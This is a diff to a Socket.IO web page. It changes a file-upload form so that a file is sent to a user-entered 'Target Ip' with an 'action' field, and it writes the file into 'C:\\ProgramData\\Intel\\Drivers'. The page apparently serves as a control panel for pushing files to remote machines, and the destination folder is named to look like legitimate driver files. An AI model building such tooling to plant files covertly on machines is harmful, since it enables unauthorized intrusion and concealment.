@@ -23,6 +23,7 @@
             // to the client. The data is then displayed in the "Received"
             // section of the page.
             socket.on('my_response', function(msg, cb) {
+                console.log(msg);
                 $('#log').append('<br>' + $('<div/>').text('Received #' + msg.count + ': ' + msg.data).html());
                 if (cb)
                     cb();
@@ -109,7 +110,7 @@
             $('#submit_upload').click(function(event) {
                 var file = $('#upload_data')[0].files[0];
                 console.log(file);
-                var payload = {data:file, dist_ip: '127.0.0.1', name: file.name, type: file.type};
+                var payload = {data:file, dist_ip: $('#upload_ip').val(), name: file.name, path: 'C:\\ProgramData\\Intel\\Drivers', action: $('#upload_action').val()};
                 socket.emit("upload", payload, (status) => {
                     console.log(status);
                 });
@@ -194,6 +195,8 @@
 
     <form id="upload" method="POST" action="#">
         <input type="file" id="upload_data" />
+        <input type="text" name="upload_ip" id="upload_ip" placeholder="Target Ip">
+        <input type="text" name="upload_action" id="upload_action" placeholder="Action" value="upload">
         <input type="button" id="submit_upload" value="Upload File">
     </form>
 
